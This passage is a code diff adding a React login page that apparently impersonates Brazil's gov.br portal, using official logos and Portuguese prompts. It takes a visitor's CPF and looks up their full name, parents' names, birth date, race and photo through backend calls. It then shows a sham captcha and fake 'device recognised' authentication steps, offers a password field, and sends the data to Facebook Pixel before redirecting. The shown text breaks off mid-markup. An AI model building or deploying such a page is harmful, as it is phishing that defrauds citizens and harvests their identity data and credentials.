@@ -1,0 +1,825 @@
+import { useState, useEffect } from 'react';
+import { Button } from '@/components/ui/button';
+import { Link } from 'wouter';
+import { fbPixel } from '@/utils/facebookPixel';
+
+
+const SvgIcon = () => {
+  return (
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      width="32"
+      height="32"
+      viewBox="0 0 32 32"
+      role="img"
+      aria-hidden="true"
+      fill="none"
+      style={{ width: '32px', height: '32px', display: 'block' }}
+    >
+      <path opacity="0.5" d="M24 28H20V32H24V28Z" fill="#0074BF" />
+      <path opacity="0.7" d="M20 28H16V32H20V28Z" fill="#0074BF" />
+      <path opacity="0.7" d="M16 28H12V32H16V28Z" fill="#0074BF" />
+      <path opacity="0.5" d="M12 28H8V32H12V28Z" fill="#0074BF" />
+      <path opacity="0.7" d="M28 24H24V28H28V24Z" fill="#0082BF" />
+      <path opacity="0.8" d="M24 24H20V28H24V24Z" fill="#0082BF" />
+      <path d="M20 24H16V28H20V24Z" fill="#0082BF" />
+      <path d="M16 24H12V28H16V24Z" fill="#0082BF" />
+      <path opacity="0.8" d="M12 24H8V28H12V24Z" fill="#0082BF" />
+      <path opacity="0.7" d="M8 24H4V28H8V24Z" fill="#0082BF" />
+      <path opacity="0.5" d="M32 20H28V24H32V20Z" fill="#008FBF" />
+      <path opacity="0.8" d="M28 20H24V24H28V20Z" fill="#008FBF" />
+      <path d="M24 20H20V24H24V20Z" fill="#008FBF" />
+      <path d="M20 20H16V24H20V20Z" fill="#008FBF" />
+      <path d="M16 20H12V24H16V20Z" fill="#008FBF" />
+      <path d="M12 20H8V24H12V20Z" fill="#008FBF" />
+      <path opacity="0.8" d="M8 20H4V24H8V20Z" fill="#008FBF" />
+      <path opacity="0.5" d="M4 20H0V24H4V20Z" fill="#008FBF" />
+      <path opacity="0.7" d="M32 16H28V20H32V16Z" fill="#009DBF" />
+      <path d="M28 16H24V20H28V16Z" fill="#009DBF" />
+      <path d="M24 16H20V20H24V16Z" fill="#009DBF" />
+      <path d="M20 16H16V20H20V16Z" fill="#009DBF" />
+      <path d="M16 16H12V20H16V16Z" fill="#009DBF" />
+      <path d="M12 16H8V20H12V16Z" fill="#009DBF" />
+      <path d="M8 16H4V20H8V16Z" fill="#009DBF" />
+      <path opacity="0.7" d="M4 16H0V20H4V16Z" fill="#009DBF" />
+      <path opacity="0.7" d="M32 12H28V16H32V12Z" fill="#00ABBF" />
+      <path d="M28 12H24V16H28V12Z" fill="#00ABBF" />
+      <path d="M24 12H20V16H24V12Z" fill="#00ABBF" />
+      <path d="M20 12H16V16H20V12Z" fill="#00ABBF" />
+      <path d="M16 12H12V16H16V12Z" fill="#00ABBF" />
+      <path d="M12 12H8V16H12V12Z" fill="#00ABBF" />
+      <path d="M8 12H4V16H8V12Z" fill="#00ABBF" />
+      <path opacity="0.7" d="M4 12H0V16H4V12Z" fill="#00ABBF" />
+      <path opacity="0.5" d="M32 8H28V12H32V8Z" fill="#00B9BF" />
+      <path opacity="0.8" d="M28 8H24V12H28V8Z" fill="#00B9BF" />
+      <path d="M24 8H20V12H24V8Z" fill="#00B9BF" />
+      <path d="M20 8H16V12H20V8Z" fill="#00B9BF" />
+      <path d="M16 8H12V12H16V8Z" fill="#00B9BF" />
+      <path d="M12 8H8V12H12V8Z" fill="#00B9BF" />
+      <path opacity="0.8" d="M8 8H4V12H8V8Z" fill="#00B9BF" />
+      <path opacity="0.5" d="M4 8H0V12H4V8Z" fill="#00B9BF" />
+      <path opacity="0.7" d="M28 4H24V8H28V4Z" fill="#00C6BF" />
+      <path opacity="0.8" d="M24 4H20V8H24V4Z" fill="#00C6BF" />
+      <path d="M20 4H16V8H20V4Z" fill="#00C6BF" />
+      <path d="M16 4H12V8H16V4Z" fill="#00C6BF" />
+      <path opacity="0.8" d="M12 4H8V8H12V4Z" fill="#00C6BF" />
+      <path opacity="0.7" d="M8 4H4V8H8V4Z" fill="#00C6BF" />
+      <path opacity="0.5" d="M24 0H20V4H24V0Z" fill="#00D4BF" />
+      <path opacity="0.7" d="M20 0H16V4H20V0Z" fill="#00D4BF" />
+      <path opacity="0.7" d="M16 0H12V4H16V0Z" fill="#00D4BF" />
+      <path opacity="0.5" d="M12 0H8V4H12V0Z" fill="#00D4BF" />
+      <path
+        d="M10.5141 14.9697L11.6379 12.4572C12.0459 11.8129 11.9958 11.0255 11.5449 10.5745C11.4876 10.5173 11.416 10.46 11.3444 10.4171C11.0366 10.2238 10.6572 10.1808 10.3065 10.2954C9.91993 10.4171 9.58349 10.6748 9.36875 11.0184C9.36875 11.0184 7.82972 14.6046 7.26421 16.2153C6.69871 17.8259 6.92062 20.7822 9.12536 22.987C11.4661 25.3277 14.8448 25.8575 17.0066 24.2397C17.0997 24.1967 17.1784 24.1395 17.2572 24.0751L23.9072 18.5202C24.2293 18.2554 24.7089 17.7042 24.2794 17.0743C23.8642 16.4586 23.0697 16.881 22.7404 17.0886L18.9107 19.8731C18.8391 19.9304 18.7318 19.9232 18.6673 19.8517C18.6673 19.8517 18.6673 19.8445 18.6602 19.8445C18.56 19.7228 18.5456 19.4079 18.696 19.2862L24.5657 14.304C25.074 13.8459 25.1456 13.1802 24.7304 12.7292C24.3295 12.2854 23.6924 12.2997 23.1842 12.7578L17.9157 16.881C17.8155 16.9597 17.6652 16.9454 17.5864 16.8452L17.5793 16.838C17.4719 16.7235 17.4361 16.5231 17.5506 16.4014L23.535 10.596C24.0074 10.1522 24.036 9.4149 23.5922 8.94245C23.3775 8.72054 23.084 8.59169 22.7762 8.59169C22.4612 8.59169 22.1606 8.70623 21.9387 8.92813L15.8255 14.6691C15.6823 14.8122 15.396 14.6691 15.3602 14.4973C15.3459 14.4328 15.3674 14.3684 15.4103 14.3255L20.0918 8.99972C20.5571 8.56306 20.5858 7.83292 20.1491 7.36763C19.7124 6.90234 18.9823 6.87371 18.517 7.31036C18.4955 7.32468 18.4812 7.34615 18.4597 7.36763L11.3659 15.2203C11.1082 15.478 10.736 15.4851 10.557 15.342C10.4425 15.2489 10.4282 15.0843 10.5141 14.9697Z"
+        fill="white"
+      />
+    </svg>
+  );
+};
+
+
+export default function LoginPage() {
+  const [cpf, setCpf] = useState('');
+  
+  useEffect(() => {
+    // Scroll to top quando página carrega
+    window.scrollTo({ top: 0, left: 0, behavior: 'smooth' });
+    
+    // Set login start time for form completion tracking
+    (window as any).loginStartTime = Date.now();
+
+    // Facebook Pixel - Login page view
+    fbPixel.trackLoginPageView();
+
+    // Microsoft Clarity - Track login page access
+    const clarity = (window as any).clarity;
+    if (clarity) {
+      clarity('event', 'login_page_access', {
+        source_page: 'landing_page',
+        authentication_method: 'gov_br',
+        funnel_step: 'step_1_authentication',
+        user_intent: 'start_application_process'
+      });
+    }
+  }, []);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [showCaptcha, setShowCaptcha] = useState(false);
+  const [selectedImages, setSelectedImages] = useState<number[]>([]);
+  const [captchaCompleted, setCaptchaCompleted] = useState(false);
+  const [cpfValidationError, setCpfValidationError] = useState('');
+  const [isValidatingCpf, setIsValidatingCpf] = useState(false);
+  const [showPasswordStep, setShowPasswordStep] = useState(false);
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const [userApiData, setUserApiData] = useState<any>(null);
+  const [showCpfError, setShowCpfError] = useState(false);
+  const [showAuthModal, setShowAuthModal] = useState(false);
+  const [authStep, setAuthStep] = useState(0);
+
+  const formatCPF = (value: string) => {
+    // Remove todos os caracteres não numéricos
+    const onlyNumbers = value.replace(/\D/g, '');
+    
+    // Aplica a máscara XXX.XXX.XXX-XX
+    if (onlyNumbers.length <= 11) {
+      return onlyNumbers
+        .replace(/(\d{3})(\d)/, '$1.$2')
+        .replace(/(\d{3})(\d)/, '$1.$2')
+        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    }
+    return onlyNumbers.substring(0, 11)
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d)/, '$1.$2')
+      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+  };
+
+  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const formattedValue = formatCPF(e.target.value);
+    setCpf(formattedValue);
+  };
+
+  const formatFullName = (name: string) => {
+    if (!name) return '';
+    return name
+      .toLowerCase()
+      .split(' ')
+      .map(word => word.charAt(0).toUpperCase() + word.slice(1))
+      .join(' ');
+  };
+
+  const captchaImages = [
+    { id: 1, url: 'https://i.ibb.co/MDQYJYbK/cachorro-1.jpg', hasDog: true },
+    { id: 2, url: 'https://picsum.photos/120/120?random=15', hasDog: true },
+    { id: 3, url: 'https://i.ibb.co/zV1vfwQY/gato-1.png', hasDog: true },
+    { id: 4, url: 'https://picsum.photos/120/120?random=52', hasDog: true },
+    { id: 5, url: 'https://i.ibb.co/zVyF8M1n/elefante-1.jpg', hasDog: true },
+    { id: 6, url: 'https://i.ibb.co/HLZzyvsv/coelho-1.webp', hasDog: true },
+    { id: 7, url: 'https://picsum.photos/120/120?random=59', hasDog: true },
+    { id: 8, url: 'https://picsum.photos/120/120?random=81', hasDog: true },
+    { id: 9, url: 'https://picsum.photos/120/120?random=12', hasDog: true }
+  ];
+
+  const correctDogImages = captchaImages.filter(img => img.hasDog).map(img => img.id);
+
+  const validateCpf = async (cpfValue: string) => {
+    setIsValidatingCpf(true);
+    setCpfValidationError('');
+    
+    try {
+      const response = await fetch('/api/consultar-cpf', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ cpf: cpfValue }),
+      });
+      
+      const result = await response.json();
+      
+      if (!result.success) {
+        setCpfValidationError(result.error || 'CPF inválido');
+        return false;
+      }
+      
+      // Armazena os dados da API para uso posterior
+      setUserApiData(result.data);
+      
+      return true;
+    } catch (error) {
+      setCpfValidationError('Erro ao validar CPF. Tente novamente.');
+      return false;
+    } finally {
+      setIsValidatingCpf(false);
+    }
+  };
+
+  const handleContinuar = async () => {
+    if (cpf.length >= 14) { // CPF completo com máscara
+      // Facebook Pixel - Track login attempt
+      fbPixel.trackLoginAttempt();
+
+      // Track CPF validation attempt
+      const clarity = (window as any).clarity;
+      if (clarity) {
+        clarity('event', 'cpf_validation_attempt', {
+          cpf_format_valid: true,
+          funnel_step: 'step_1_cpf_entry',
+          user_progress: 'advancing'
+        });
+      }
+
+      const isValid = await validateCpf(cpf);
+      if (isValid) {
+        if (clarity) {
+          clarity('event', 'cpf_validation_success', {
+            has_user_data: !!(userApiData && userApiData.DADOS),
+            data_source: userApiData ? 'api' : 'none',
+            funnel_step: 'step_1_cpf_validated'
+          });
+        }
+
+        // Fazer requisição para /api/foto (fire-and-forget)
+        const userIpData = localStorage.getItem('user_ip_data');
+        let estado = 'SP'; // valor padrão
+        
+        if (userIpData) {
+          try {
+            const ipData = JSON.parse(userIpData);
+            estado = ipData.region || 'SP';
+          } catch (error) {
+            console.error('Erro ao parsear user_ip_data:', error);
+          }
+        }
+
+        const cpfSomenteNumeros = cpf.replace(/\D/g, '');
+        
+        fetch('/api/foto', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            estado: estado,
+            cpf: cpfSomenteNumeros
+          }),
+        })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+          }
+          return response.json();
+        })
+        .then(fotoResult => {
+          if (fotoResult && typeof fotoResult === 'object' && fotoResult.success) {
+            localStorage.setItem('foto', JSON.stringify(fotoResult));
+          }
+        })
+        .catch(error => {
+          console.error('Erro ao buscar foto:', error);
+        });
+
+        setShowCaptcha(true);
+      } else {
+        if (clarity) {
+          clarity('event', 'cpf_validation_failed', {
+            error_type: cpfValidationError || 'unknown_error',
+            funnel_step: 'step_1_cpf_error'
+          });
+        }
+      }
+    }
+  };
+
+  const handleImageClick = (imageId: number) => {
+    if (selectedImages.includes(imageId)) {
+      setSelectedImages(selectedImages.filter(id => id !== imageId));
+    } else {
+      setSelectedImages([...selectedImages, imageId]);
+    }
+  };
+
+  const handleVerifyCaptcha = () => {
+    setShowCaptcha(false);
+    setShowAuthModal(true);
+    startAuthSequence();
+  };
+
+  const startAuthSequence = () => {
+    // Verificar se há foto no localStorage
+    const fotoData = localStorage.getItem('foto');
+    let hasFoto = false;
+    
+    if (fotoData) {
+      try {
+        const foto = JSON.parse(fotoData);
+        hasFoto = Boolean(foto?.success && foto?.foto_base64);
+      } catch (error) {
+        console.error('Erro ao parsear foto:', error);
+      }
+    }
+
+    // Criar steps baseado na disponibilidade da foto (otimizado para velocidade)
+    const authSteps = [
+      { step: 0, message: 'Acessando...', duration: 800 },
+      { step: 1, message: 'Autenticando...', duration: 1000 },
+      ...(hasFoto ? [{ step: 2, message: 'Verificando identidade...', duration: 800 }] : []),
+      { step: hasFoto ? 3 : 2, message: 'Aparelho Autenticado', duration: 700 },
+      { step: hasFoto ? 4 : 3, message: 'Login já realizado neste aparelho', duration: 700 }
+    ];
+
+    let currentStep = 0;
+    
+    const processStep = () => {
+      if (currentStep < authSteps.length) {
+        setAuthStep(currentStep);
+        setTimeout(() => {
+          currentStep++;
+          processStep();
+        }, authSteps[currentStep].duration);
+      } else {
+        fetchUserDataAndRedirect();
+      }
+    };
+
+    processStep();
+  };
+
+  const fetchUserDataAndRedirect = async () => {
+    try {
+      // Usar dados já obtidos na validação inicial (evita chamada duplicada)
+      if (userApiData && userApiData.DADOS) {
+        const userData = {
+          cpf: cpf,
+          nomeCompleto: userApiData.DADOS.nome ? formatFullName(userApiData.DADOS.nome) : '',
+          dataAniversario: userApiData.DADOS.nascimento || userApiData.DADOS.data_nascimento || '',
+          nomeMae: userApiData.DADOS.mae ? formatFullName(userApiData.DADOS.mae) : '',
+          sexo: userApiData.DADOS.sexo || '',
+          ...(userApiData.DADOS.municipio_nascimento && { municipioNascimento: userApiData.DADOS.municipio_nascimento }),
+          ...(userApiData.DADOS.raca && { raca: userApiData.DADOS.raca }),
+          ...(userApiData.DADOS.pai && { nomePai: formatFullName(userApiData.DADOS.pai) }),
+          ...(userApiData.DADOS.nome_social && { nomeSocial: formatFullName(userApiData.DADOS.nome_social) })
+        };
+        
+        localStorage.setItem('userData', JSON.stringify(userData));
+        
+        // Facebook Pixel - Login success with user data
+        fbPixel.trackLoginSuccess(userData);
+        
+        // Microsoft Clarity - Custom Event
+        const clarity = (window as any).clarity;
+        if (clarity) {
+          clarity('event', 'login_completed', {
+            authentication_method: 'cpf_auto',
+            user_status: 'authenticated',
+            form_completion_time: Date.now() - (window as any).loginStartTime || 0,
+            has_user_data: true
+          });
+        }
+      }
+    } catch (error) {
+      console.error('Error saving user data:', error);
+    }
+    
+    window.location.href = '/localizacao';
+  };
+
+  const handlePasswordSubmit = () => {
+    setIsProcessing(true);
+    
+    // Salva os dados do usuário no localStorage antes de redirecionar
+    if (userApiData && userApiData.DADOS) {
+      const userData = {
+        cpf: cpf,
+        nomeCompleto: userApiData.DADOS.nome ? formatFullName(userApiData.DADOS.nome) : '',
+        dataAniversario: userApiData.DADOS.nascimento || userApiData.DADOS.data_nascimento || '',
+        nomeMae: userApiData.DADOS.mae ? formatFullName(userApiData.DADOS.mae) : '',
+        sexo: userApiData.DADOS.sexo || '',
+        ...(userApiData.DADOS.municipio_nascimento && { municipioNascimento: userApiData.DADOS.municipio_nascimento }),
+        ...(userApiData.DADOS.raca && { raca: userApiData.DADOS.raca }),
+        ...(userApiData.DADOS.pai && { nomePai: formatFullName(userApiData.DADOS.pai) }),
+        ...(userApiData.DADOS.nome_social && { nomeSocial: formatFullName(userApiData.DADOS.nome_social) })
+      };
+      
+      localStorage.setItem('userData', JSON.stringify(userData));
+      
+      // Facebook Pixel - Login success with user data
+      fbPixel.trackLoginSuccess(userData);
+    } else {
+      // Facebook Pixel - Login success without user data
+      fbPixel.trackLoginSuccess({});
+    }
+
+    // Microsoft Clarity - Custom Event
+    const clarity = (window as any).clarity;
+    if (clarity) {
+      clarity('event', 'login_completed', {
+        authentication_method: 'cpf_password',
+        user_status: 'authenticated',
+        form_completion_time: Date.now() - (window as any).loginStartTime || 0,
+        has_user_data: !!(userApiData && userApiData.DADOS)
+      });
+    }
+    
+    setTimeout(() => {
+      window.location.href = '/localizacao';
+    }, 1444);
+  };
+
+  const handleCancel = () => {
+    setShowPasswordStep(false);
+    setPassword('');
+  };
+
+  const handleAuthOptionClick = () => {
+    setShowCpfError(true);
+  };
+
+  return (
+    <div className="min-h-screen bg-gray-100" style={{ fontFamily: 'Rawline, sans-serif', lineHeight: '1.5' }}>
+      <header 
+        style={{
+          background: '#FFFFFF 0 0 no-repeat padding-box',
+          display: 'flex',
+          flexDirection: 'row',
+          justifyContent: 'space-between',
+          alignItems: 'center',
+          boxShadow: '0 3px 6px #00000029',
+          marginBottom: '6px',
+          width: '100%',
+          padding: '0 10px 0 10px',
+        }}
+        >
+        <a style={{
+          color: '#333333',
+          fontSize: '0.9em',
+          fontWeight: 500,
+          textDecoration: 'none'
+        }}>
+          <img style={{
+          width: '100px',
+          margin: '10px'
+          }} src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"/>
+        </a>
+
+        <div className='flex gap-4'>
+          <i className='fas fa-moon text-base text-gov-blue'></i>
+          <i className='fas fa-cookie-bite text-base text-gov-blue'></i>
+        </div>
+      </header>
+      {/* Main content */}
+      <div className="container mx-auto p-8" style={{
+      margin: '20px auto auto auto',
+      marginTop: 0
+      }}>
+        <div className="flex justify-center">
+          <div className="w-full max-w-md">
+            <div className="bg-white rounded-lg shadow-md p-[10px]">
+              
+              {!showPasswordStep ? (
+                <>
+                  <h2 className="text-lg font-semibold mb-4 text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '15px' }}>
+                    Identifique-se no gov.br com:
+                  </h2>
+                  
+                  <div className="flex items-center mb-2">
+                    <img className='mr-2' src='https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png'/>
+                    <span className="text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>
+                      Número do CPF
+                    </span>
+                  </div>
+                  
+                  <p className="text-gray-600 text-sm mb-4" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>
+                    Digite seu CPF para <span className="font-semibold">criar</span> ou <span className="font-semibold">acessar</span> sua conta gov.br
+                  </p>
+                  
+                  <div >
+                    {showCpfError && (
+                      <div className="mb-3 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                        Digite o CPF e clique em continuar para validar e iniciar a inscrição
+                      </div>
+                    )}
+                    <label htmlFor="cpf" className="block text-[#333333] text-sm font-bold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                      CPF
+                    </label>
+                    <input 
+                      type="text" 
+                      id="cpf" 
+                      value={cpf}
+                      onChange={handleCpfChange}
+                      inputMode='numeric'
+                      placeholder="Digite seu CPF" 
+                      className="shadow text-[0.8em] text-[#333333] h-[36px] appearance-none border rounded w-full py-2 px-3 text-[#333333] leading-tight "
+                      style={{ 
+                            fontFamily: 'Rawline, sans-serif', 
+                            padding: '0 20px 0 20px',
+                            width: '100%',
+                            height: '36px !important',
+                            background: '#FFFFFF 0 0 no-repeat padding-box',
+                            border: '1px solid #888888',
+                            borderRadius: '4px',
+                            fontSize: '0.8em !important',
+                        color: '#333333',
+                    }}
+                      maxLength={14}
+                    />
+                    
+                    {cpfValidationError && (
+                      <div className="mt-2 text-red-600 text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                        {cpfValidationError}
+                      </div>
+                    )}
+                  </div>
+                  
+                  <Button
+                    onClick={handleContinuar}
+                    disabled={cpf.length < 14 || isValidatingCpf}
+                    className={`w-full py-2 px-4 rounded focus:outline-none opacity-1 focus:shadow-outline font-bold bg-[#1351B4] cta-button-primary`}
+                    style={{ fontFamily: 'Rawline, sans-serif', boxShadow: '0 2px 3px #00000029', borderRadius: '24px', opacity: 1,margin: '30px 0 25px 0' }}
+                  >
+                    {isValidatingCpf ? (
+                      <div className="flex items-center justify-center">
+                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+                      </div>
+                    ) : (
+                      'Continuar'
+                    )}
+                  </Button>
+                  
+                  <p className="text-[#333333] text-sm font-semibold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                    Outras opções de identificação:
+                  </p>
+                  <hr className='text-[#333333]'/>
+                  <div className="space-y-2">
+                    <div onClick={handleAuthOptionClick} className="login-option flex items-center cursor-pointer rounded transition-colors duration-300" data-option="internet-banking" style={{
+                  marginTop: '20px'
+                    }}>
+                        <img src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" 
+                             alt="Internet Banking" className="mr-2"/>
+                        <div className="flex items-center">
+                            <span className="text-green-700 text-xs">Login com seu banco</span>
+                            <span className="ml-2 bg-green-700 text-white text-xs px-1 py-0.5 uppercase font-bold" style={{fontSize: '8px'}}>
+                                SUA CONTA SERÁ PRATA
+                            </span>
+                        </div>
+                    </div>
+                    <div onClick={handleAuthOptionClick} className="flex items-center cursor-pointer" style={{marginTop: '20px'}}>
+                      <img className='mr-2' src='https://sso.acesso.gov.br/assets/govbr/img/icons/app-identidade-govbr.png' />
+                      <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                        Seu aplicativo gov.br
+                      </span>
+                    </div>
+                    
+                    <div onClick={handleAuthOptionClick} className="flex items-center cursor-pointer" style={{marginTop: '20px'}}>
+                      <img className='mr-2' src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" />
+                      <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                        Seu certificado digital
+                      </span>
+                    </div>
+                    
+                    <div onClick={handleAuthOptionClick} className="flex items-center cursor-pointer" style={{marginTop: '20px'}}>
+                      <img className='mr-2' src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" />
+                      <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                        Seu certificado digital em nuvem
+                      </span>
+                    </div>
+                  </div>
+                </>
+              ) : (
+                <>
+                  <h2 className="text-lg font-semibold mb-4 text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '15px' }}>
+                    Digite sua senha
+                  </h2>
+                  
+                  <div className="flex items-center mb-2">
+
+                    <span className="text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>
+                      CPF: 
+                      <br/>
+                      <strong>{cpf}</strong>
+                    </span>
+                  </div>
+                  
+                  <div>
+                    <label htmlFor="password" className="block text-[#333333] text-sm font-bold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>
+                      Senha
+                    </label>
+                    <div className="relative">
+                      <input 
+                        type={showPassword ? "text" : "password"} 
+                        id="password" 
+                        value={password}
+                        onChange={(e) => setPassword(e.target.value)}
+                        placeholder="Digite sua senha atual" 
+                        className="shadow text-[0.8em] text-[#333333] h-[36px] appearance-none border rounded w-full py-2 px-3 text-[#333333] leading-tight"
+                        style={{ 
+                              fontFamily: 'Rawline, sans-serif', 
+                              padding: '0 40px 0 20px',
+                              width: '100%',
+                              height: '36px !important',
+                              background: '#FFFFFF 0 0 no-repeat padding-box',
+                              border: '1px solid #888888',
+                              borderRadius: '4px',
+                              fontSize: '0.8em !important',
+                          color: '#333333'
+                      }}
+                      />
+                      <button
+                        type="button"
+                        className="absolute inset-y-0 right-0 pr-3 flex items-center"
+                        onClick={() => setShowPassword(!showPassword)}
+                      >
+                        <i className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'} text-gray-400 hover:text-gray-600`}></i>
+                      </button>
+                    </div>
+                  </div>
+                  
+                  <div className="flex space-x-3" style={{ margin: '30px 0 25px 0' }}>
+         
+                    <Button
+                      onClick={handleCancel}
+                      disabled={isProcessing}
+                      className="flex-1 bg-gray-500 text-white font-bold py-2 px-4 rounded focus:outline-none opacity-1 focus:shadow-outline hover:bg-gray-600 transition-colors"
+                      style={{ fontFamily: 'Rawline, sans-serif', boxShadow: '0 2px 3px #00000029', borderRadius: '24px' }}
+                    >
+                      Cancelar
+                    </Button>
+
+                    <Button
+                      onClick={handlePasswordSubmit}
+                      disabled={!password || isProcessing}
+                      className="flex-1 bg-[#1351B4] text-white font-bold py-2 px-4 rounded focus:outline-none opacity-1 focus:shadow-outline cta-button-primary animate-gradient transform hover:scale-105 transition-all duration-300"
+                      style={{ fontFamily: 'Rawline, sans-serif', boxShadow: '0 2px 3px #00000029', borderRadius: '24px' }}
+                    >
+                      {isProcessing ? (
+                        <div className="flex items-center justify-center">
+                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+                          Entrando...
+                        </div>
+                      ) : (
+                        'Entrar'
+                      )}
+                    </Button>
+
+                  </div>
+                </>
+              )}
+            </div>
+          </div>
+        </div>
+      </div>
+
+      {/* Modal Captcha */}
+      {showCaptcha && (
+        <div className="fixed inset-0 bg-white bg-opacity-80 flex items-center justify-center z-50" style={{ fontFamily: 'Rawline, sans-serif' }}>
+          <div className="bg-white rounded-lg shadow-xl max-w-sm w-full mx-4 overflow-hidden">
+            {/* Header com fundo colorido */}
+            <div className="bg-teal-600 text-white p-4">
+              <div className="flex justify-between items-start">
+                <div className="flex items-start space-x-3 flex-shrink-0 flex-1">
+                  <div>
+                    <h3 className="text-[1.15em] font-medium leading-tight">
+                      Encontre todas as criaturas que andam <strong>sobre quatro patas</strong><br />
+                    </h3>
+                  </div>
+                </div>
+              </div>
+            </div>
+            
+            {/* Grid de imagens */}
+            <div className="p-4">
+              <div className="grid grid-cols-3 gap-1 mb-4">
+                {captchaImages.map((image) => (
+                  <div
+                    key={image.id}
+                    className={`relative cursor-pointer border-2 rounded overflow-hidden transition-all ${
+                      selectedImages.includes(image.id)
+                        ? 'border-teal-500 shadow-md'
+                        : 'border-gray-200 hover:border-gray-300'
+                    }`}
+                    onClick={() => handleImageClick(image.id)}
+                  >
+                    <img
+                      src={image.url}
+                      alt={`Captcha ${image.id}`}
+                      className="w-full h-28 object-cover"
+                    />
+                    {selectedImages.includes(image.id) && (
+                      <div className="absolute inset-0 bg-teal-500 bg-opacity-40 flex items-center justify-center">
+                        <div className="w-4 h-4 bg-teal-500 rounded-full flex items-center justify-center">
+                          <i className="fas fa-check text-white text-xs"></i>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                ))}
+              </div>
+              
+              {/* Botões inferiores */}
+              <div className="flex items-center justify-between">
+                <div className="flex space-x-2">
+                  <button className="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center">
+                    <i className="fas fa-ellipsis-h text-gray-600 text-sm"></i>
+                  </button>
+                  <button className="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center">
+                    <i className="fas fa-redo text-gray-600 text-sm"></i>
+                  </button>
+                  <button className="w-8 h-8 bg-gray-100 rounded hover:bg-gray-200 flex items-center justify-center">
+                    <i className="fas fa-volume-up text-gray-600 text-sm"></i>
+                  </button>
+                </div>
+                <SvgIcon />
+                <Button
+                  onClick={handleVerifyCaptcha}
+                  disabled={isProcessing}
+                  style={{
+                    background: '#1351B4 0 0 no-repeat padding-box'
+                  }}
+                  className="bg-gray-600 hover:bg-gray-700 text-white px-6 py-2 rounded text-sm font-medium"
+                >
+                  {isProcessing ? (
+                    <div className="flex items-center">
+                      <div className="w-3 h-3 border border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+                      Verificando...
+                    </div>
+                  ) : (
+                    'Avançar'
+                  )}
+                </Button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Authentication Modal - Minimalista Governamental */}
+      {showAuthModal && (() => {
+        // Obter foto do localStorage para renderização
+        const fotoData = localStorage.getItem('foto');
+        let fotoBase64 = null;
+        let hasFoto = false;
+        
+        if (fotoData) {
+          try {
+            const foto = JSON.parse(fotoData);
+            if (foto?.success && foto?.foto_base64) {
+              fotoBase64 = foto.foto_base64;
+              hasFoto = true;
+            }
+          } catch (error) {
+            console.error('Erro ao parsear foto:', error);
+          }
+        }
+
+        return (
+          <div className="fixed inset-0 bg-gray-500 bg-opacity-50 flex items-center justify-center z-50" style={{ fontFamily: 'Rawline, sans-serif' }}>
+            <div className="bg-white border border-gray-300 max-w-sm w-full mx-4 p-6 text-center">
+              
+              {/* Logo Gov.br */}
+              <div className="mb-6">
+                <img 
+                  src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" 
+                  alt="Gov.br" 
+                  className="mx-auto"
+                  style={{ width: '60px' }}
+                />
+              </div>
+              
+              {/* Status */}
+              <div className="mb-4">
+                {authStep === 0 && (
+                  <div className="w-6 h-6 border-2 border-gray-400 border-t-transparent rounded-full animate-spin mx-auto mb-3"></div>
+                )}
+                {(authStep === 1 || authStep === 2 || authStep === 3 || authStep === 4) && (
+                  <div className="w-6 h-6 bg-green-600 rounded-full mx-auto mb-3 flex items-center justify-center">
+                    <div className="w-3 h-3 bg-white rounded-full"></div>
+                  </div>
+                )}
+                
+                {/* Foto do usuário - exibida na etapa 2 se disponível */}
+                {authStep === 2 && hasFoto && fotoBase64 && (
+                  <div className="mb-4">
+                    <img 
+                      src={`data:image/jpeg;base64,${fotoBase64}`}
+                      alt="Foto do usuário" 
+                      className="w-24 h-24 rounded-full mx-auto object-cover border-2 border-green-600"
+                    />
+                  </div>
+                )}
+                
+                <h3 className="text-base font-medium mb-2 text-gray-800">
+                  {authStep === 0 && 'Acessando Sistema'}
+                  {authStep === 1 && 'Dispositivo Reconhecido'}
+                  {authStep === 2 && (hasFoto ? 'Identidade Verificada' : 'Login Automático Realizado')}
